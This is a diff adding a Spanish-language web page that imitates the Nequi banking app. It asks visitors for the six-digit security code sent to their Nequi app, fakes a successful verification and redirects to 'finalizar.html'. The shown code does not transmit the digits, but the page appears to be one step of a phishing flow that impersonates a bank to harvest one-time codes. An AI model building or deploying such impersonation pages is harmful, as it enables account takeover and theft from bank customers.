@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Código de Seguridad</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #6A11CB 0%, #2575FC 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #6A11CB;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        .title {
+            color: #333;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .description {
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .code-input {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #E0E0E0;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            background: #F8F9FA;
+        }
+        .code-input:focus {
+            border-color: #6A11CB;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #6A11CB;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #2575FC;
+        }
+        .error {
+            color: #FF4444;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">NQ</div>
+        <h1 class="title">Código de Seguridad</h1>
+        <p class="description">
+            Ingresa el código de 6 dígitos que recibiste en tu app de Nequi
+        </p>
+
+        <div class="code-inputs">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+        </div>
+
+        <button class="btn" onclick="verificarCodigo()">Verificar Código</button>
+        <div class="error" id="errorMessage"></div>
+    </div>
+
+    <script>
+        function verificarCodigo() {
+            const inputs = document.querySelectorAll('.code-input');
+            const codigo = Array.from(inputs).map(input => input.value).join('');
+
+            if (codigo.length !== 6) {
+                document.getElementById('errorMessage').textContent = 'Por favor ingresa el código completo';
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            // Simular verificación exitosa
+            document.getElementById('errorMessage').style.display = 'none';
+            alert('Código verificado correctamente');
+
+            // Redirigir a finalizar después de 2 segundos
+            setTimeout(() => {
+                window.location.href = 'finalizar.html';
+            }, 2000);
+        }
+
+        // Configurar inputs para auto-avance
+        const inputs = document.querySelectorAll('.code-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Enfocar primer input
+        inputs[0].focus();
+    </script>
+</body>
+</html>
